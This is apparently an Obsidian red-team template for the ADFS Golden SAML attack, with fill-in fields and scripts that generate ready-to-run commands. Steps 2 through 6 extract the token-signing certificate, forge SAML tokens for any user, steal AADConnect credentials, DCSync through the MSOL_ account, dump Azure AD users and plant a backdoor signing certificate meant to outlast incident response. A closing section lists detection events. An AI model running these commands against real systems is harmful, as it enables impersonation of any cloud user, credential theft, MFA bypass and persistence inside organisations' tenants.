---
# Attack-specific fields
adfs_server:
adfs_fqdn:
adfs_service_account:
token_signing_cert_b64:
token_signing_cert_pass:
target_upn:
target_sid:
relying_party:
golden_saml_action: dump_cert
notes:
---

# ADFS / Golden SAML

> [!abstract] Attack Summary
> **Active Directory Federation Services (ADFS)** is Microsoft's on-premises SSO solution, commonly used to federate with Azure AD / Office 365. The **Token Signing Certificate** is the private key used to sign SAML assertions. If stolen, an attacker can forge SAML tokens for **any user in any federated application** — including cloud resources — without knowing credentials or triggering password-based alerts. This is the **Golden SAML** attack.

---

## Baseline (from [[00 - Engagement Baseline]])

```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
dv.table(["Field", "Value"], [
  ["Domain",      b?.domain      ?? "—"],
  ["DC IP",       b?.dc_ip       ?? "—"],
  ["DC FQDN",     b?.dc_fqdn     ?? "—"],
  ["Domain SID",  b?.domain_sid  ?? "—"],
  ["Username",    b?.username    ?? "—"],
  ["OS Env",      b?.os_env      ?? "—"],
]);
```

---

## Attack-Specific Configuration

```dataviewjs
const p = dv.current();
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
const actions = ["dump_cert","forge_saml","aadconnect_extract","adfs_recon","golden_saml_use"];
const actionOptions = actions.map(a => `option(${a})`).join(',');

dv.table(["Field", "Value"], [
  ["ADFS Server IP",          `\`INPUT[text:adfs_server]\``],
  ["ADFS FQDN",               `\`INPUT[text:adfs_fqdn]\``],
  ["ADFS Service Account",    `\`INPUT[text:adfs_service_account]\``],
  ["Relying Party (SP)",      `\`INPUT[text:relying_party]\``],
  ["Target UPN",              `\`INPUT[text:target_upn]\``],
  ["Target SID",              `\`INPUT[text:target_sid]\``],
  ["Token Signing Cert Pass", `\`INPUT[text:token_signing_cert_pass]\``],
  ["Action",                  `\`INPUT[inlineSelect(defaultValue(${p.golden_saml_action ?? 'dump_cert'}),${actionOptions}):golden_saml_action]\``],
]);
```

> [!info] Prerequisites
> - SYSTEM/DA on the ADFS server OR access to the ADFS service account
> - The token signing certificate is stored in the **ADFS DKM (Distributed Key Manager)** container in AD or in the ADFS service account's certificate store
> - **AADConnect** (Azure AD Connect) service account may also have access — see Step 4

---

## Step 1 — ADFS Reconnaissance

**Windows — Enumerate ADFS configuration**
```dataviewjs
const p = dv.current();
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
const domain = b?.domain ?? "DOMAIN";
const dc_ip  = b?.dc_ip  ?? "DC_IP";
dv.paragraph("```powershell\n# Find ADFS servers in the domain\nGet-ADObject -Filter {objectClass -eq 'serviceConnectionPoint' -and keywords -like '*adfs*'} -Properties * | Select Name,serviceBindingInformation\n\n# Or via DNS\nResolve-DnsName _adfs._tcp." + domain + " -Type SRV\n\n# Enumerate ADFS configuration from AD (DKM container)\n# The DKM stores encrypted token signing keys\nGet-ADObject -SearchBase \"CN=ADFS,CN=Microsoft,CN=Program Data,DC=" + domain.split('.').join(',DC=') + "\" -Filter * -Properties * | Select DistinguishedName,thumbnailPhoto\n\n# List ADFS relying parties (requires ADFS admin or SYSTEM on ADFS)\nGet-AdfsRelyingPartyTrust | Select Name,Identifier,IsEnabled\n\n# Get ADFS properties\nGet-AdfsProperties | Select HostName,HttpPort,HttpsPort,TlsClientPort\n```");
```

**Linux — Enumerate ADFS via LDAP**
```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
const domain   = b?.domain   ?? "DOMAIN";
const dc_ip    = b?.dc_ip    ?? "DC_IP";
const username = b?.username ?? "USER";
const password = b?.password ?? "PASSWORD";
dv.paragraph("```bash\n# Find ADFS service connection points\nnxc ldap " + dc_ip + " -u '" + username + "' -p '" + password + "' -d '" + domain + "' --query '(objectClass=serviceConnectionPoint)' --attr serviceBindingInformation\n\n# Check for DKM container (stores token signing key material)\nimpacket-ldapsearch -u '" + domain + "\\\\" + username + "' -p '" + password + "' -h " + dc_ip + " -b 'CN=Microsoft,CN=Program Data," + domain.split('.').map(x => 'DC=' + x).join(',') + "' '(objectClass=*)' thumbnailPhoto\n\n# AADInternals — enumerate ADFS from Azure side\n# (if you have Azure credentials)\n# Get-AADIntADFSConfiguration\n```");
```

ADFS Server: `INPUT[text:adfs_server]` | FQDN: `INPUT[text:adfs_fqdn]`

---

## Step 2 — Dump Token Signing Certificate (SYSTEM on ADFS)

> [!warning] The token signing certificate is the crown jewel. With it, you can forge SAML tokens for any user in any federated service. Multiple extraction paths exist.

**Windows — ADFSDump (Golden SAML cert extraction)**
```dataviewjs
const p = dv.current();
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
const domain   = b?.domain   ?? "DOMAIN";
const dc_ip    = b?.dc_ip    ?? "DC_IP";
const username = b?.username ?? "USER";
const password = b?.password ?? "PASSWORD";
const adfsServiceAcct = p?.adfs_service_account || "ADFS_SERVICE_ACCOUNT";
dv.paragraph("```bash\n# ADFSDump — dump ADFS token signing certificate\n# Must run as SYSTEM on the ADFS server OR as the ADFS service account\nexecute-assembly C:\\\\Tools\\\\ADFSDump\\\\ADFSDump\\\\bin\\\\Release\\\\ADFSDump.exe\n\n# Output:\n# [*] Token Signing Certificate\n# [*] Private key decrypted: <BASE64>\n# [*] Certificate stored to disk: tokenSigning.pfx\n\n# If running as SYSTEM, specify service account for DKM decryption\nexecute-assembly C:\\\\Tools\\\\ADFSDump\\\\ADFSDump\\\\bin\\\\Release\\\\ADFSDump.exe /domain:" + domain + " /DKMServiceAccount:" + adfsServiceAcct + "\n```");
```

**Windows — Direct certificate extraction via ADFS cmdlets**
```dataviewjs
dv.paragraph("```powershell\n# On ADFS server as admin/SYSTEM\nGet-AdfsCertificate -CertificateType Token-Signing | Select-Object -ExpandProperty Certificate | ForEach-Object {\n  $certBase64 = [System.Convert]::ToBase64String($_.Export([System.Security.Cryptography.X509Certificates.X509ContentType]::Pkcs12, 'password'))\n  Write-Host 'Certificate (PFX base64):'\n  Write-Host $certBase64\n}\n\n# Export to file\n$cert = Get-AdfsCertificate -CertificateType Token-Signing\n$cert.Certificate.Export([System.Security.Cryptography.X509Certificates.X509ContentType]::Pkcs12, 'CertPass123!') | Set-Content -Path C:\\\\Windows\\\\Temp\\\\tokensigning.pfx -Encoding Byte\n```");
```

**Windows — AADInternals from ADFS server**
```dataviewjs
dv.paragraph("```powershell\n# Install AADInternals (if not present)\nInstall-Module AADInternals\nImport-Module AADInternals\n\n# Export token signing certificate (must be run on ADFS server)\nExport-AADIntADFSSigningCertificate -Password 'CertPass123!'\n\n# Outputs: ADFSSigningCertificate.pfx\n```");
```

**Linux — Extract via DPAPI (if ADFS cert stored in service account profile)**
```dataviewjs
const p = dv.current();
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
const domain   = b?.domain   ?? "DOMAIN";
const dc_ip    = b?.dc_ip    ?? "DC_IP";
const username = b?.username ?? "USER";
const password = b?.password ?? "PASSWORD";
dv.paragraph("```bash\n# If ADFS service account credentials are known, decrypt DPAPI-protected certs\nimpacket-dpapi masterkey -file /path/to/masterkey -sid SERVICE_ACCOUNT_SID -password 'SERVICE_ACCOUNT_PASSWORD'\n\nimpacket-dpapi credential -file /path/to/credential -key DECRYPTED_MASTERKEY\n\n# SharpDPAPI from Windows side\nexecute-assembly C:\\\\Tools\\\\SharpDPAPI\\\\SharpDPAPI\\\\bin\\\\Release\\\\SharpDPAPI.exe machinecerts\n```");
```

Token Signing Cert Pass: `INPUT[text:token_signing_cert_pass]`

---

## Step 3 — Forge Golden SAML Token

> [!info] With the token signing certificate, forge SAML assertions for any user — including global admins in Azure AD / Office 365 federated users.

**Linux — ADFSpoof (forge SAML token)**
```dataviewjs
const p = dv.current();
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
const domain     = b?.domain ?? "DOMAIN";
const targetUPN  = p?.target_upn || "administrator@domain.com";
const targetSID  = p?.target_sid || "S-1-5-21-REPLACE-500";
const certPass   = p?.token_signing_cert_pass || "CertPass123!";
const relyingParty = p?.relying_party || "urn:federation:MicrosoftOnline";
dv.paragraph("```bash\n# ADFSpoof — create forged SAML token\npip3 install ADFSpoof\n\n# Forge SAML for Office 365 (most common relying party)\npython3 ADFSpoof.py \\\n  --pfx tokensigning.pfx \\\n  --password '" + certPass + "' \\\n  --domain " + domain + " \\\n  --upn '" + targetUPN + "' \\\n  --objectguid 'USER_OBJECT_GUID' \\\n  --rp '" + relyingParty + "'\n\n# For on-premises SharePoint\npython3 ADFSpoof.py \\\n  --pfx tokensigning.pfx \\\n  --password '" + certPass + "' \\\n  --domain " + domain + " \\\n  --upn '" + targetUPN + "' \\\n  --rp 'https://sharepoint.domain.local/_trust/'\n\n# Output: forged SAML assertion XML (base64 encoded)\n```");
```

**Windows — AADInternals Golden SAML**
```dataviewjs
const p = dv.current();
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
const targetUPN  = p?.target_upn || "admin@tenant.onmicrosoft.com";
const certPass   = p?.token_signing_cert_pass || "CertPass123!";
dv.paragraph("```powershell\n# Using the exported PFX, forge a SAML token for Office 365\nOpen-AADIntOffice365Portal -SPIdentifier 'urn:federation:MicrosoftOnline' \\\n  -Issuer 'http://domain.local/adfs/services/trust' \\\n  -PfxFileName '.\\\\ADFSSigningCertificate.pfx' \\\n  -PfxPassword '" + certPass + "' \\\n  -UserName '" + targetUPN + "'\n\n# This opens a browser session as the target user!\n\n# Get Access Token for MS Graph as target user\n$token = Get-AADIntSAMLToken \\\n  -PfxFileName '.\\\\ADFSSigningCertificate.pfx' \\\n  -PfxPassword '" + certPass + "' \\\n  -UserName '" + targetUPN + "'\n\n# Use token to access Azure AD\nGet-AADIntAccessTokenForMSGraph -SAMLToken $token\n```");
```

Target UPN: `INPUT[text:target_upn]`

---

## Step 4 — Azure AD Connect (AADConnect) Attack Path

> [!info] **Azure AD Connect** syncs on-prem AD to Azure AD. The **MSOL_** service account has high-privilege AD rights (DCSync equivalent) and the **ADSync** database stores credentials for the Azure AD Connector. Compromising AADConnect is often easier than ADFS itself.

**Windows — AADConnect credential extraction**
```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
const domain = b?.domain ?? "DOMAIN";
dv.paragraph("```powershell\n# Find AADConnect server\nGet-ADServiceAccount -Filter {name -like 'MSOL_*'} -Properties * | Select Name,PasswordLastSet,Description\n\n# On the AADConnect server — extract Azure AD connector credentials\n# Method 1: AADInternals\nImport-Module AADInternals\n$credentials = Get-AADIntSyncCredentials\nWrite-Host \"Username: $($credentials.Username)\"\nWrite-Host \"Password: $($credentials.Password)\"\n\n# Method 2: adconnectdump\n# https://github.com/fox-it/adconnectdump\npython3 adconnectdump.py\n\n# With the Azure AD connector account, you can:\n# 1. Reset any user password in Azure AD (including admins)\n# 2. Enable pass-through auth bypass\n# 3. Extract password hashes via AADInternals\n```");
```

**Linux — Abuse MSOL_ account for DCSync**
```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
const domain   = b?.domain   ?? "DOMAIN";
const dc_ip    = b?.dc_ip    ?? "DC_IP";
dv.paragraph("```bash\n# MSOL_ account has DCSync rights by default — use it directly\n# First get the password from AADConnect DB (see above)\nimpacket-secretsdump '" + domain + "/MSOL_ACCOUNT:PASSWORD@" + dc_ip + "' -just-dc\n\n# Or use to reset Azure AD user passwords\n# (After getting Azure connector credentials)\n# AADInternals: Set-AADIntUserPassword -UserPrincipalName 'admin@tenant.com' -Password 'NewPass123!'\n```");
```

---

## Step 5 — Use Forged Token / Access Cloud Resources

```dataviewjs
const p = dv.current();
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
const targetUPN = p?.target_upn || "admin@tenant.onmicrosoft.com";
dv.paragraph("```bash\n# With Golden SAML token, access Office 365 as target user\n# The token bypasses MFA (SAML assertion claims MFA was already done)\n\n# Using AADInternals — open portal as target user\n# Open-AADIntOffice365Portal (see Step 3)\n\n# Access Azure AD via PowerShell with forged token\n# $token = (forged access token)\n# Connect-AzureAD -AadAccessToken $token -AccountId '" + targetUPN + "'\n\n# Enumerate Azure AD admin roles\n# Get-AzureADDirectoryRole | Get-AzureADDirectoryRoleMember\n\n# Access Microsoft Graph\ncurl -H \"Authorization: Bearer $ACCESS_TOKEN\" \\\n  'https://graph.microsoft.com/v1.0/me'\n\ncurl -H \"Authorization: Bearer $ACCESS_TOKEN\" \\\n  'https://graph.microsoft.com/v1.0/users?$select=displayName,userPrincipalName,assignedLicenses'\n\n# Dump all users from Azure AD\ncurl -H \"Authorization: Bearer $ACCESS_TOKEN\" \\\n  'https://graph.microsoft.com/v1.0/users' | jq '.value[].userPrincipalName'\n```");
```

---

## Step 6 — ADFS Persistence (Re-Register Token Signing Certificate)

```dataviewjs
dv.paragraph("```powershell\n# If you have control of ADFS, add a secondary token signing certificate\n# This provides persistent access even after the original cert is rotated\n\n# On ADFS server as admin\n# Generate new certificate\n$cert = New-SelfSignedCertificate -Subject 'CN=ADFS Backdoor Cert' \\\n  -KeyAlgorithm RSA -KeyLength 2048 -HashAlgorithm SHA256 \\\n  -NotAfter (Get-Date).AddYears(10)\n\n# Export\n$pfxPass = ConvertTo-SecureString 'BackdoorPass123!' -AsPlainText -Force\n$cert | Export-PfxCertificate -FilePath C:\\\\Windows\\\\Temp\\\\backdoor.pfx -Password $pfxPass\n\n# Register as secondary token signing cert in ADFS\nAdd-AdfsCertificate -CertificateType Token-Signing -Thumbprint $cert.Thumbprint\n\n# Now you can forge tokens with the backdoor cert indefinitely\n# Even after incident response rotates the original cert\n```");
```

---

## OPSEC

> [!warning] Detection Indicators
> - ADFS token signing cert access: **Event 307** in ADFS Admin log (certificate operation).
> - Unusual SAML assertions: Monitor for SAML tokens with non-standard lifetimes or attribute values via ADFS auditing (**Event 1200, 1201**).
> - **Azure AD sign-in logs:** Golden SAML logins appear as federated logins — look for sign-ins from unusual IPs or at unusual times for high-privilege accounts.
> - MSOL_ account activity outside AADConnect server: anomalous LDAP replication requests (**Event 4662** with replication GUIDs).
> - ADSync database access: file access events on the ADSync database (`C:\Program Data\Microsoft Azure AD Sync\Data\ADSync.mdf`).
> - **Microsoft Defender for Identity / MDI:** detects Golden SAML specifically by correlating SAML tokens with expected ADFS issuance patterns.
> - **Microsoft Sentinel:** `AuditLogs` and `SigninLogs` tables — filter for `AuthenticationProtocol = saml20` with `ConditionalAccessStatus = notApplied` (MFA bypassed via SAML).

---

## Notes & Results

`INPUT[textarea:notes]`
